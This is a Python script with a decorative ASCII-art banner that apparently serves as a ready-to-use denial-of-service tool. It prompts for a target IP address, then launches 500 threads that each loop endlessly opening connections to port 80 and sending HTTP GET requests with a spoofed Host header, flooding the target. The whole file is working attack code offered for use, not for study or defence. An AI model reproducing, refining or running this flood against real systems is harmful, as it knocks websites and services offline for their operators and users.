import socket
import threading

print('\033[96m'"         _             _          _            _               _          _             _             _            _    ")
print('\033[96m'"        /\ \     _    /\ \       /\ \         /\_\            /\ \       _\ \          _\ \          /\ \         /\ \     ")
print('\033[94m'"       /  \ \   /\_\ /  \ \      \_\ \       / / /  _         \ \ \     /\__ \        /\__ \        /  \ \       /  \ \    ")
print('\033[1;33m'"      / /\ \ \_/ / // /\ \ \     /\__ \     / / /  /\_\       /\ \_\   / /_ \_\      / /_ \_\      / /\ \ \     / /\ \ \   ")
print('\033[96m'"     / / /\ \___/ // / /\ \_\   / /_ \ \   / / /__/ / /      / /\/_/  / / /\/_/     / / /\/_/     / / /\ \_\   / / /\ \_\ ")
print('\033[96m'"    / / /  \/____// /_/_ \/_/  / / /\ \ \ / /\_____/ /      / / /    / / /         / / /         / /_/_ \/_/  / / /_/ / / ")
print('\033[94m'"   / / /    / / // /____/\    / / /  \/_// /\_______/\033[1;33m      / / /    / / /         / / /         / /____/\    / / /__\/ /  ")
print('\033[32m'"  / / /    / / // /\____\/   / / /      / / /\ \ \   \033[1;33m     / / /    / / / ____    / / / ____    / /\____\/   / / /_____/   ")
print('\033[96m'" / / /    / / // / /______  / / /      / / /  \ \ \  \033[1;33m ___/ / /__  / /_/_/ ___/\ / /_/_/ ___/\ / / /______  / / /\ \ \    ")
print('\033[96m'"/ / /    / / // / /_______\/_/ /      / / /    \ \ \ \033[1;33m/\__\/_/___\/_______/\__\//_______/\__\// / /_______\/ / /  \ \ \    ")
print('\033[94m'"\/_/     \/_/ \/__________/\_\/       \/_/      \_\_\\\/_________/\_______\/    \_______\/    \/__________/\/_/    \_\/    ")

print('\033[0;31m'"                       _                __     ")
print('\033[0;31m'"                  ____(____    ___ ___ / /_    ")
print('\033[0;31m'"                 / __/ / _ \  / _ / -_/ __/    ")
print('\033[0;31m'"                /_/ /_/ .__/ /_//_\__/\__/     ")
print('\033[0;31m'"                     /_/                       ")

print('\033[32m'"author=@Alexandervasiliu")
number = input('\033[0;31m'"insert ip address=  ")
address = input('\033[0;31m'"insert your ip address=  ")

target = number
fake_ip = address
port = 80



attack_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()